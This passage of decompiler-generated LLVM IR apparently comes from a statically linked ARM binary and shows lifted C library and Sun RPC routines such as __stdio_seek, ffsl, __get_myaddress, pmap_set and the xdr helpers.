  %v1_30fe8 = trunc i32 %v1_30fe4 to i16
  store i16 %v1_30fe8, i16* %v1_30fe0, align 2
  %v0_30fec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_30fec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_30ff0

dec_label_pc_30ff0:                               ; preds = %dec_label_pc_30fa4, %dec_label_pc_30fe0
  %v1_30ff8 = phi i32 [ %v1_30ff8.pre, %dec_label_pc_30fa4 ], [ %v0_30fec, %dec_label_pc_30fe0 ]
  %v2_30ff4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_30ff4, i32* @r4, align 4
  ret i32 %v1_30ff8

; uselistorder directives
  uselistorder i32 %v3_30f68, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_30ff0, { 1, 0 }
  uselistorder label %dec_label_pc_30fe0, { 1, 0 }
  uselistorder label %dec_label_pc_30f98, { 1, 0 }
  uselistorder label %dec_label_pc_30f8c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_31008 = load i32, i32* %arg2, align 4
  %v3_31008 = add i32 %tmp, 4
  %v4_31008 = inttoptr i32 %v3_31008 to i32*
  %v5_31008 = load i32, i32* %v4_31008, align 4
  %v1_3100c = add i32 %arg1, 4
  %v2_3100c = inttoptr i32 %v1_3100c to i32*
  %v3_3100c = load i32, i32* %v2_3100c, align 4
  store i32 %tmp, i32* @r4, align 4
  %v5_31014 = call i32 @__GI_lseek64(i32 %v3_3100c, i32 %tmp, i32 %v2_31008, i32 %v5_31008, i32 ptrtoint (i32* @0 to i32))
  %v1_31018 = icmp slt i32* %arg2, null
  br i1 %v1_31018, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_310205 = load i32, i32* @r4, align 4
  %v4_310206 = inttoptr i32 %v3_310205 to i32*
  store i32 %v5_31014, i32* %v4_310206, align 4
  %v6_310207 = add i32 %v3_310205, 4
  %v7_310208 = inttoptr i32 %v6_310207 to i32*
  store i32 %tmp, i32* %v7_310208, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v5_31014, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 5, 0, 6, 3, 7, 1, 2, 4, 9, 10, 11, 12, 21, 22, 19, 20, 17, 18, 15, 16, 13, 14, 23, 31, 32, 29, 30, 27, 28, 25, 26, 24, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 8, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_lseek64, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_31038(i32 %arg1) local_unnamed_addr {
dec_label_pc_31038:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_31040 = load i32, i32* @r0, align 4
  %v1_31040 = load i32, i32* @r1, align 4
  %v2_31040 = inttoptr i32 %v0_31040 to i8*
  %v3_31040 = call i32 @_memcpy(i8* %v2_31040, i32 %v1_31040)
  ret i32 %v3_31040

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @ffsl(i32 %arg1) local_unnamed_addr {
entry:
  %v3_31054 = urem i32 %arg1, 65536
  %v2_31058 = icmp eq i32 %v3_31054, 0
  br i1 %v2_31058, label %.thread1, label %bb21

.thread1:                                         ; preds = %entry
  %v4_3105c = sdiv i32 %arg1, 65536
  br label %bb21

bb21:                                             ; preds = %entry, %.thread1
  %v1_31070 = phi i32 [ %v4_3105c, %.thread1 ], [ %arg1, %entry ]
  %storemerge = phi i32 [ 17, %.thread1 ], [ 1, %entry ]
  %v1_31068 = urem i32 %v1_31070, 256
  %v2_31068 = icmp eq i32 %v1_31068, 0
  br i1 %v2_31068, label %bb22, label %.thread3

bb22:                                             ; preds = %bb21
  %v2_3106c = or i32 %storemerge, 8
  %v4_31070 = sdiv i32 %v1_31070, 256
  br label %.thread3

.thread3:                                         ; preds = %bb21, %bb22
  %v1_3107c = phi i32 [ %storemerge, %bb21 ], [ %v2_3106c, %bb22 ]
  %v1_31080 = phi i32 [ %v1_31070, %bb21 ], [ %v4_31070, %bb22 ]
  %v1_31078 = urem i32 %v1_31080, 16
  %v2_31078 = icmp eq i32 %v1_31078, 0
  br i1 %v2_31078, label %bb23, label %.thread5

bb23:                                             ; preds = %.thread3
  %v2_3107c = add nsw i32 %v1_3107c, 4
  %v4_31080 = sdiv i32 %v1_31080, 16
  %v2_31084 = urem i32 %v2_3107c, 256
  br label %.thread5

.thread5:                                         ; preds = %.thread3, %bb23
  %v1_3108c = phi i32 [ %v1_3107c, %.thread3 ], [ %v2_31084, %bb23 ]
  %v1_31090 = phi i32 [ %v1_31080, %.thread3 ], [ %v4_31080, %bb23 ]
  %v1_31088 = urem i32 %v1_31090, 4
  %v2_31088 = icmp eq i32 %v1_31088, 0
  br i1 %v2_31088, label %bb24, label %.thread7

bb24:                                             ; preds = %.thread5
  %v2_3108c = add nsw i32 %v1_3108c, 2
  %v4_31090 = sdiv i32 %v1_31090, 4
  %v2_31094 = urem i32 %v2_3108c, 256
  br label %.thread7

.thread7:                                         ; preds = %bb24, %.thread5
  %v2_310a419 = phi i32 [ %v1_3108c, %.thread5 ], [ %v2_31094, %bb24 ]
  %v0_31098.pr = phi i32 [ %v1_31090, %.thread5 ], [ %v4_31090, %bb24 ]
  %v2_31098 = icmp eq i32 %v0_31098.pr, 0
  br i1 %v2_31098, label %.thread9, label %bb25

bb25:                                             ; preds = %.thread7
  %v2_3109c = urem i32 %v0_31098.pr, 2
  %v2_310a0 = xor i32 %v2_3109c, 1
  %v3_310a4 = add nsw i32 %v2_310a0, %v2_310a419
  br label %.thread9

.thread9:                                         ; preds = %.thread7, %bb25
  %v1_310a8 = phi i32 [ 0, %.thread7 ], [ %v3_310a4, %bb25 ]
  ret i32 %v1_310a8

; uselistorder directives
  uselistorder i32 %v1_31090, { 2, 0, 1 }
  uselistorder i32 %v1_31080, { 2, 0, 1 }
  uselistorder i32 %v1_31070, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__get_myaddress(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i16, align 2
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4176 = alloca i32, align 4
  %v6_310ac = load i32, i32* @r5, align 4
  %v12_310ac = load i32, i32* @r7, align 4
  %v15_310ac = load i32, i32* @r8, align 4
  %v18_310ac = load i32, i32* @sb, align 4
  %v21_310ac = load i32, i32* @sl, align 4
  %v24_310ac = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r8, align 4
  %v2_310bc = ptrtoint i32* %stack_var_-4176 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_310c8 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_310c8, i32* @sl, align 4
  %v1_310d0 = icmp slt i32 %v3_310c8, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @sb, align 4
  br i1 %v1_310d0, label %.dec_label_pc_3111c_crit_edge, label %dec_label_pc_310e0

.dec_label_pc_3111c_crit_edge:                    ; preds = %entry
  %.pre10 = ptrtoint i32* %stack_var_-80 to i32
  br label %dec_label_pc_3111c

dec_label_pc_310e0:                               ; preds = %entry
  store i32 4096, i32* @r3, align 4
  %v3_310e8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v3_310e8, i32* @lr, align 4
  store i32 35090, i32* %r1.global-to-local, align 4
  %v2_310f8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_310f8, i32* %r2.global-to-local, align 4
  store i32 4096, i32* %stack_var_-48, align 4
  %v3_31104 = call i32 @ioctl(i32 %v3_310c8, i32 35090, i32 %v2_310f8)
  %v1_31108 = icmp slt i32 %v3_31104, 0
  br i1 %v1_31108, label %dec_label_pc_31118, label %bb

bb:                                               ; preds = %dec_label_pc_310e0
  store i32 1, i32* @fp, align 4
  store i32 %v3_310e8, i32* @r7, align 4
  br label %dec_label_pc_3112c.preheader

dec_label_pc_31118:                               ; preds = %dec_label_pc_310e0
  br label %dec_label_pc_3111c

dec_label_pc_3111c:                               ; preds = %.thread, %.dec_label_pc_3111c_crit_edge, %dec_label_pc_31118
  %.pre.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_3111c_crit_edge ], [ %v3_310e8, %dec_label_pc_31118 ], [ %v2_3112c.pre-phi, %.thread ]
  %stack_var_-44.0 = phi i32 [ %tmp19, %.dec_label_pc_3111c_crit_edge ], [ %v2_310bc, %dec_label_pc_31118 ], [ %stack_var_-44.1.ph, %.thread ]
  %v1_3111c = phi i32 [ -34332, %.dec_label_pc_3111c_crit_edge ], [ -34308, %dec_label_pc_31118 ], [ -34252, %.thread ]
  %v0_3111c = load i32, i32* @sb, align 4
  %v2_3111c = add i32 %v0_3111c, %v1_3111c
  %v1_31120 = inttoptr i32 %v2_3111c to i8*
  %v2_31120 = call i32 @perror(i8* %v1_31120)
  %v1_31128 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_3112c.preheader

dec_label_pc_3112c.preheader:                     ; preds = %bb, %dec_label_pc_3111c
  %v2_3112c.pre-phi = phi i32 [ %.pre.pre-phi, %dec_label_pc_3111c ], [ %v3_310e8, %bb ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0, %dec_label_pc_3111c ], [ %v2_310bc, %bb ]
  br label %dec_label_pc_3112c

dec_label_pc_3112c:                               ; preds = %bb37, %dec_label_pc_3112c.preheader
  store i32 %v2_3112c.pre-phi, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.1.ph, i32* @r5, align 4
  %v3_31134 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_31134, i32* @r6, align 4
  %v2_311c44 = icmp eq i32 %v3_31134, 0
  br i1 %v2_311c44, label %dec_label_pc_311cc, label %dec_label_pc_3113c

dec_label_pc_3113c:                               ; preds = %dec_label_pc_3112c, %dec_label_pc_311bc
  %v0_3113c = phi i32 [ %v1_311bc, %dec_label_pc_311bc ], [ %stack_var_-44.1.ph, %dec_label_pc_3112c ]
  %v1_31140 = inttoptr i32 %v0_3113c to i32*
  %v2_31140 = load i32, i32* %v1_31140, align 4
  %v3_31140 = add i32 %v0_3113c, 4
  %v4_31140 = inttoptr i32 %v3_31140 to i32*
  %v5_31140 = load i32, i32* %v4_31140, align 4
  store i32 %v5_31140, i32* %r1.global-to-local, align 4
  %v6_31140 = add i32 %v0_3113c, 8
  %v7_31140 = inttoptr i32 %v6_31140 to i32*
  %v8_31140 = load i32, i32* %v7_31140, align 4
  store i32 %v8_31140, i32* %r2.global-to-local, align 4
  %v9_31140 = add i32 %v0_3113c, 12
  %v10_31140 = inttoptr i32 %v9_31140 to i32*
  %v11_31140 = load i32, i32* %v10_31140, align 4
  store i32 %v11_31140, i32* %r3.global-to-local, align 4
  %v12_31140 = add i32 %v0_3113c, 16
  store i32 %v12_31140, i32* @r4, align 4
  store i32 %v2_31140, i32* %stack_var_-80, align 4
  %v1_3114c = inttoptr i32 %v12_31140 to i32*
  %v2_3114c = load i32, i32* %v1_3114c, align 4
  %v3_3114c = add i32 %v0_3113c, 20
  %v4_3114c = inttoptr i32 %v3_3114c to i32*
  %v5_3114c = load i32, i32* %v4_3114c, align 4
  store i32 %v5_3114c, i32* %r1.global-to-local, align 4
  %v6_3114c = add i32 %v0_3113c, 24
  %v7_3114c = inttoptr i32 %v6_3114c to i32*
  %v8_3114c = load i32, i32* %v7_3114c, align 4
  store i32 %v8_3114c, i32* %r2.global-to-local, align 4
  %v9_3114c = add i32 %v0_3113c, 28
  %v10_3114c = inttoptr i32 %v9_3114c to i32*
  %v11_3114c = load i32, i32* %v10_3114c, align 4
  store i32 %v11_3114c, i32* @r3, align 4
  %v4_31150 = trunc i32 %v2_3114c to i16
  store i16 %v4_31150, i16* %stack_var_-64, align 2
  %v0_31154 = load i32, i32* @sl, align 4
  store i32 35091, i32* %r1.global-to-local, align 4
  store i32 %v2_3112c.pre-phi, i32* %r2.global-to-local, align 4
  %v3_31160 = call i32 @ioctl(i32 %v0_31154, i32 35091, i32 %v2_3112c.pre-phi)
  %v1_31164 = icmp slt i32 %v3_31160, 0
  br i1 %v1_31164, label %.thread, label %dec_label_pc_31170

.thread:                                          ; preds = %dec_label_pc_3113c
  br label %dec_label_pc_3111c

dec_label_pc_31170:                               ; preds = %dec_label_pc_3113c
  store i32 %v2_3112c.pre-phi, i32* @lr, align 4
  %v3_31174 = load i16, i16* %stack_var_-64, align 2
  %v4_31174 = sext i16 %v3_31174 to i32
  store i32 %v4_31174, i32* %r2.global-to-local, align 4
  %v1_31178 = urem i32 %v4_31174, 2
  %v2_31178 = icmp eq i32 %v1_31178, 0
  %v0_311bc.pre = load i32, i32* @r5, align 4
  br i1 %v2_31178, label %dec_label_pc_311bc, label %dec_label_pc_31180

dec_label_pc_31180:                               ; preds = %dec_label_pc_31170
  %v1_31180 = add i32 %v0_311bc.pre, 16
  %v2_31180 = inttoptr i32 %v1_31180 to i16*
  %v3_31180 = load i16, i16* %v2_31180, align 2
  %v4_31180 = zext i16 %v3_31180 to i32
  store i32 %v4_31180, i32* %r3.global-to-local, align 4
  %v7_31184 = icmp eq i16 %v3_31180, 2
  br i1 %v7_31184, label %dec_label_pc_3118c, label %dec_label_pc_311bc

dec_label_pc_3118c:                               ; preds = %dec_label_pc_31180
  %v0_31190 = load i32, i32* @fp, align 4
  %v1_31190 = xor i32 %v0_31190, 1
  store i32 %v1_31190, i32* %r3.global-to-local, align 4
  %tmp36 = udiv i32 %v4_31174, 8
  %v4_31194 = urem i32 %tmp36, 2
  %v5_31194 = or i32 %v1_31190, %v4_31194
  store i32 %v5_31194, i32* %r2.global-to-local, align 4
  %v7_31194 = icmp eq i32 %v5_31194, 0
  br i1 %v7_31194, label %dec_label_pc_311bc, label %dec_label_pc_3119c

dec_label_pc_3119c:                               ; preds = %dec_label_pc_3118c
  %v0_3119c = load i32, i32* @r4, align 4
  %v1_3119c = inttoptr i32 %v0_3119c to i32*
  %v2_3119c = load i32, i32* %v1_3119c, align 4
  %v3_3119c = add i32 %v0_3119c, 4
  %v4_3119c = inttoptr i32 %v3_3119c to i32*
  %v5_3119c = load i32, i32* %v4_3119c, align 4
  store i32 %v5_3119c, i32* %r1.global-to-local, align 4
  %v6_3119c = add i32 %v0_3119c, 8
  %v7_3119c = inttoptr i32 %v6_3119c to i32*
  %v8_3119c = load i32, i32* %v7_3119c, align 4
  store i32 %v8_3119c, i32* %r2.global-to-local, align 4
  %v9_3119c = add i32 %v0_3119c, 12
  %v10_3119c = inttoptr i32 %v9_3119c to i32*
  %v11_3119c = load i32, i32* %v10_3119c, align 4
  store i32 %v11_3119c, i32* %r3.global-to-local, align 4
  %v0_311a0 = load i32, i32* @r8, align 4
  %v1_311a0 = inttoptr i32 %v0_311a0 to i32*
  store i32 %v2_3119c, i32* %v1_311a0, align 4
  %v3_311a0 = add i32 %v0_311a0, 4
  %v4_311a0 = inttoptr i32 %v3_311a0 to i32*
  %v5_311a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_311a0, i32* %v4_311a0, align 4
  %v6_311a0 = add i32 %v0_311a0, 8
  %v7_311a0 = inttoptr i32 %v6_311a0 to i32*
  %v8_311a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_311a0, i32* %v7_311a0, align 4
  %v9_311a0 = add i32 %v0_311a0, 12
  %v10_311a0 = inttoptr i32 %v9_311a0 to i32*
  %v11_311a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_311a0, i32* %v10_311a0, align 4
  store i32 28416, i32* %r3.global-to-local, align 4
  %v2_311a8 = load i32, i32* @r8, align 4
  %v3_311a8 = add i32 %v2_311a8, 2
  %v4_311a8 = inttoptr i32 %v3_311a8 to i16*
  store i16 28416, i16* %v4_311a8, align 2
  %v0_311ac = load i32, i32* @sl, align 4
  %v1_311b0 = call i32 @__GI_close(i32 %v0_311ac)
  br label %dec_label_pc_311e4

dec_label_pc_311bc:                               ; preds = %dec_label_pc_31170, %dec_label_pc_31180, %dec_label_pc_3118c
  %v1_311bc = add i32 %v0_311bc.pre, 32
  store i32 %v1_311bc, i32* @r5, align 4
  %v0_311c0 = load i32, i32* @r6, align 4
  %v1_311c0 = add i32 %v0_311c0, -32
  store i32 %v1_311c0, i32* @r6, align 4
  %v2_311c4 = icmp eq i32 %v1_311c0, 0
  br i1 %v2_311c4, label %dec_label_pc_311cc, label %dec_label_pc_3113c

dec_label_pc_311cc:                               ; preds = %dec_label_pc_311bc, %dec_label_pc_3112c
  %v0_311cc = load i32, i32* @fp, align 4
  %v7_311cc = icmp eq i32 %v0_311cc, 1
  br i1 %v7_311cc, label %bb37, label %dec_label_pc_311d8

bb37:                                             ; preds = %dec_label_pc_311cc
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_3112c

dec_label_pc_311d8:                               ; preds = %dec_label_pc_311cc
  %v0_311d8 = load i32, i32* @sl, align 4
  %v1_311dc = call i32 @__GI_close(i32 %v0_311d8)
  %v0_311e0 = load i32, i32* @r6, align 4
  br label %dec_label_pc_311e4

dec_label_pc_311e4:                               ; preds = %dec_label_pc_3119c, %dec_label_pc_311d8
  %storemerge2 = phi i32 [ %v0_311e0, %dec_label_pc_311d8 ], [ 1, %dec_label_pc_3119c ]
  store i32 %v6_310ac, i32* @r5, align 4
  store i32 %v12_310ac, i32* @r7, align 4
  store i32 %v15_310ac, i32* @r8, align 4
  store i32 %v18_310ac, i32* @sb, align 4
  store i32 %v21_310ac, i32* @sl, align 4
  store i32 %v24_310ac, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_311c0, { 1, 0 }
  uselistorder i32 %v1_311bc, { 1, 0 }
  uselistorder i32 %v0_3113c, { 7, 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %stack_var_-44.1.ph, { 0, 2, 1 }
  uselistorder i32 %v2_3112c.pre-phi, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v3_310e8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_310bc, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i16* %stack_var_-64, { 1, 0 }
  uselistorder i32 (i32)* @__GI_close, { 1, 0, 5, 4, 13, 6, 12, 11, 10, 9, 8, 7, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 3, 1, 0, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 14, 13, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 2, 15, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i8*)* @perror, { 2, 0, 1 }
  uselistorder label %dec_label_pc_311e4, { 1, 0 }
  uselistorder label %dec_label_pc_311bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_3113c, { 1, 0 }
  uselistorder label %dec_label_pc_3112c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_3111c, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v6_3120c = load i32, i32* @r5, align 4
  %v15_3120c = load i32, i32* @r8, align 4
  %v2_31214 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_31214, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_3122c = call i32 @__get_myaddress(i32* nonnull %stack_var_-48)
  %v2_31234 = icmp eq i32 %v2_3122c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_31234, label %dec_label_pc_31300, label %dec_label_pc_31240

dec_label_pc_31240:                               ; preds = %entry
  %v3_31248 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34200) to i32*), align 4
  store i32 %v3_31248, i32* @r4, align 4
  store i32 400, i32* @lr, align 4
  %v4_31250 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34204) to i32*), align 4
  store i32 %v4_31250, i32* @r3, align 4
  store i32 %v2_31214, i32* @r0, align 4
  store i32 100000, i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_31274 = call i32 @__GI_clntudp_bufcreate()
  store i32 %v0_31274, i32* %r5.global-to-local, align 4
  %v2_31278 = icmp eq i32 %v0_31274, 0
  br i1 %v2_31278, label %dec_label_pc_31300, label %dec_label_pc_31280

dec_label_pc_31280:                               ; preds = %dec_label_pc_31240
  %v1_312ac = add i32 %v0_31274, 4
  %v2_312ac = inttoptr i32 %v1_312ac to i32*
  %v3_312ac = load i32, i32* %v2_312ac, align 4
  %v1_312d4 = inttoptr i32 %v3_312ac to i32*
  %v2_312d4 = load i32, i32* %v1_312d4, align 4
  call void @__pseudo_branch(i32 %v2_312d4)
  %v0_312e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_312e4 = add i32 %v0_312e0, 4
  %v2_312e4 = inttoptr i32 %v1_312e4 to i32*
  %v3_312e4 = load i32, i32* %v2_312e4, align 4
  %v1_312e8 = add i32 %v3_312e4, 16
  %v2_312e8 = inttoptr i32 %v1_312e8 to i32*
  %v3_312e8 = load i32, i32* %v2_312e8, align 4
  call void @__pseudo_branch(i32 %v3_312e8)
  br label %dec_label_pc_31300

dec_label_pc_31300:                               ; preds = %entry, %dec_label_pc_31240, %dec_label_pc_31280
  %storemerge = phi i32 [ %tmp12, %dec_label_pc_31280 ], [ 0, %dec_label_pc_31240 ], [ 0, %entry ]
  store i32 %v6_3120c, i32* %r5.global-to-local, align 4
  store i32 %v15_3120c, i32* @r8, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_31300, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %v2_3132c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_3132c, i32* @r5, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  %v2_3134c = call i32 @__get_myaddress(i32* nonnull %stack_var_-56)
  %v2_31354 = icmp eq i32 %v2_3134c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_31354, label %dec_label_pc_3143c, label %dec_label_pc_31360

dec_label_pc_31360:                               ; preds = %entry
  %v3_31368 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34200) to i32*), align 4
  store i32 %v3_31368, i32* @r4, align 4
  store i32 400, i32* @lr, align 4
  %v4_31370 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -34204) to i32*), align 4
  store i32 %v4_31370, i32* @r3, align 4
  store i32 %v2_3132c, i32* @r0, align 4
  store i32 100000, i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_31394 = call i32 @__GI_clntudp_bufcreate()
  store i32 %v0_31394, i32* @r5, align 4
  %v2_31398 = icmp eq i32 %v0_31394, 0
  br i1 %v2_31398, label %dec_label_pc_3143c, label %dec_label_pc_313a0

dec_label_pc_313a0:                               ; preds = %dec_label_pc_31360
  %v1_313c8 = add i32 %v0_31394, 4
  %v2_313c8 = inttoptr i32 %v1_313c8 to i32*
  %v3_313c8 = load i32, i32* %v2_313c8, align 4
  store i32 %v3_313c8, i32* @r4, align 4
  %v1_313f0 = inttoptr i32 %v3_313c8 to i32*
  %v2_313f0 = load i32, i32* %v1_313f0, align 4
  store i32 %v2_313f0, i32* @ip, align 4
  store i32 201724, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_313f0)
  br i1 false, label %dec_label_pc_3141c, label %dec_label_pc_31404

dec_label_pc_31404:                               ; preds = %dec_label_pc_313a0
  %v0_31408 = load i32, i32* @r5, align 4
  %v0_3140c = load i32, i32* @r6, align 4
  %v2_3140c = add i32 %v0_3140c, -34228
  store i32 %v2_3140c, i32* @r1, align 4
  %v2_31410 = call i32 @clnt_perror(i32 %v0_31408, i32 %v2_3140c)
  br label %dec_label_pc_3141c

dec_label_pc_3141c:                               ; preds = %dec_label_pc_313a0, %dec_label_pc_31404
  %stack_var_-40.0 = phi i32 [ %tmp14, %dec_label_pc_313a0 ], [ 0, %dec_label_pc_31404 ]
  %v0_3141c = load i32, i32* @r5, align 4
  %v1_31420 = add i32 %v0_3141c, 4
  %v2_31420 = inttoptr i32 %v1_31420 to i32*
  %v3_31420 = load i32, i32* %v2_31420, align 4
  %v1_31424 = add i32 %v3_31420, 16
  %v2_31424 = inttoptr i32 %v1_31424 to i32*
  %v3_31424 = load i32, i32* %v2_31424, align 4
  call void @__pseudo_branch(i32 %v3_31424)
  br label %dec_label_pc_3143c

dec_label_pc_3143c:                               ; preds = %entry, %dec_label_pc_31360, %dec_label_pc_3141c
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_3141c ], [ 0, %dec_label_pc_31360 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_3143c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_3141c, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v2_3146c = ptrtoint i32* %stack_var_-32 to i32
  store i32 2, i32* %stack_var_-32, align 4
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %v2_3146c
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_31498 = load i32, i32* @lr, align 4
  store i32 %v0_31498, i32* %stack_var_-4, align 4
  %v0_3149c = load i32, i32* @r0, align 4
  %v1_3149c = inttoptr i32 %v0_3149c to i32*
  %v2_3149c = load i32, i32* %v1_3149c, align 4
  %v2_314a0 = icmp eq i32 %v2_3149c, 0
  br i1 %v2_314a0, label %dec_label_pc_314ac, label %dec_label_pc_314c0

dec_label_pc_314ac:                               ; preds = %entry
  %v1_314ac = add i32 %v0_3149c, 4
  %v2_314ac = inttoptr i32 %v1_314ac to i32*
  %v3_314ac = load i32, i32* %v2_314ac, align 4
  %v1_314b0 = add i32 %v3_314ac, 4
  %v2_314b0 = inttoptr i32 %v1_314b0 to i32*
  %v3_314b0 = load i32, i32* %v2_314b0, align 4
  call void @__pseudo_branch(i32 %v3_314b0)
  br label %bb3

dec_label_pc_314c0:                               ; preds = %entry
  %v7_314c0 = icmp eq i32 %v2_3149c, 1
  br i1 %v7_314c0, label %dec_label_pc_314c8, label %dec_label_pc_314dc

dec_label_pc_314c8:                               ; preds = %dec_label_pc_314c0
  %v1_314c8 = add i32 %v0_3149c, 4
  %v2_314c8 = inttoptr i32 %v1_314c8 to i32*
  %v3_314c8 = load i32, i32* %v2_314c8, align 4
  %v1_314cc = inttoptr i32 %v3_314c8 to i32*
  %v2_314cc = load i32, i32* %v1_314cc, align 4
  call void @__pseudo_branch(i32 %v2_314cc)
  br label %bb3

dec_label_pc_314dc:                               ; preds = %dec_label_pc_314c0
  %v7_314dc = icmp eq i32 %v2_3149c, 2
  br i1 %v7_314dc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_314dc
  store i32 0, i32* @r0, align 4
  br label %bb3

.thread:                                          ; preds = %dec_label_pc_314dc
  store i32 1, i32* @r0, align 4
  br label %bb3

bb3:                                              ; preds = %bb, %dec_label_pc_314c8, %dec_label_pc_314ac, %.thread
  %v2_314ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_314ec, i32* @lr, align 4
  %v1_314f0 = load i32, i32* @r0, align 4
  ret i32 %v1_314f0

; uselistorder directives
  uselistorder i32 %v0_3149c, { 1, 0, 2 }
